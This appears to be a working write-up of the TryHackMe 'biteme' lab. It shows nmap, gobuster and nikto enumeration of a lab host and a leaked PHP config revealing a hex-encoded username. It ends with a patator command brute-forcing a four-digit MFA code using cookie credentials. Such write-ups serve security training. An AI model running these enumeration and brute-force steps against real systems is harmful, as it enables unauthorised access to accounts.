BITE ME

ENUMERATION 

"""


┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/biteme]
└─$ sudo nmap  -p- -sV -sC --min-rate 2000  -Pn $IP  -oN nmap.txt 
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-13 03:26 EDT
Warning: 10.10.127.203 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.127.203
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 89:ec:67:1a:85:87:c6:f6:64:ad:a7:d1:9e:3a:11:94 (RSA)
|   256 7f:6b:3c:f8:21:50:d9:8b:52:04:34:a5:4d:03:3a:26 (ECDSA)
|_  256 c4:5b:e5:26:94:06:ee:76:21:75:27:bc:cd:ba:af:cc (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.35 seconds
                                                              

"""

GOBUSTER

"""



┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/biteme]
└─$ gobuster dir -u http://10.10.127.203/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -t 80 --no-error  
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.127.203/
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/13 03:28:58 Starting gobuster in directory enumeration mode
===============================================================
/console              (Status: 301) [Size: 316] [--> http://10.10.127.203/console/]
/server-status        (Status: 403) [Size: 278]                                    
                                                                                   
===============================================================
2022/03/13 03:37:25 Finished
===============================================================


"""

NIKTO

"""
                                                                                                                                                                       
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/biteme]
└─$ nikto --host http://10.10.127.203/console/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.127.203
+ Target Hostname:    10.10.127.203
+ Target Port:        80
+ Start Time:         2022-03-13 03:39:49 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ Cookie PHPSESSID created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ /console/config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-3268: /console/css/: Directory indexing found.
+ OSVDB-3092: /console/css/: This might be interesting...
^[[A
^C     

"""

imp 

 /console/config.php: PHP Config file may contain database IDs and passwords.

http://10.10.127.203/console/config.phps

"""


<?php

define('LOGIN_USER', '6a61736f6e5f746573745f6163636f756e74'); 

"""

patator http_fuzz \
url="http://10.10.127.203/console/mfa.php" \
method=POST \
body="code=RANGE0" \
0=int:1000-9999 \
header="Cookie: user=jason_test_account; pwd=violet" \
-x ignore:fgrep="Incorrect code"